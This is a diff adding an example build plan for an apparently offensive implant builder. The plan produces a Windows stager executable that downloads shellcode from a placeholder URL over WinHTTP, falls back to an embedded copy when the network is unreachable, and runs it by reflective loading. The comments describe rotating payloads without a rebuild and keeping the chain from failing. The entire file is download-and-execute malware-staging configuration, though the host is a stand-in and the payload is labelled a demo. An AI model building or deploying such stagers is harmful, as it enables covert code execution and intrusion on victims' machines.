@@ -1,0 +1,32 @@
+# Network stager with an embedded fallback: staged when the network is there,
+# stageless when it is not.
+#
+# The payload is embedded like any stageless build *and* the stager prefers the
+# fetched bytes: a reachable URL rotates the payload without a rebuild, and an
+# unreachable one still runs the embedded copy instead of failing the chain.
+# `implant.source` is read at build time, so that copy is validated (and
+# hash-pinned with `sha256`) as usual.
+#
+#   cargo run -- build examples/plans/network-stager-fallback.yaml
+
+schema: 6
+name: network-stager-fallback
+
+build:
+  payloads:
+    implant:
+      source: ./examples/payloads/demo_shellcode.bin
+      format: shellcode
+  output:
+    path: ./dist/stager_shellcode_fallback.exe
+
+runtime:
+  - technique: network_stager
+    params:
+      payload: implant
+      url: "https://example.invalid/implant.bin"
+      downloader: winhttp
+      fallback: embedded
+  - technique: reflective_loading
+    params:
+      payload: implant
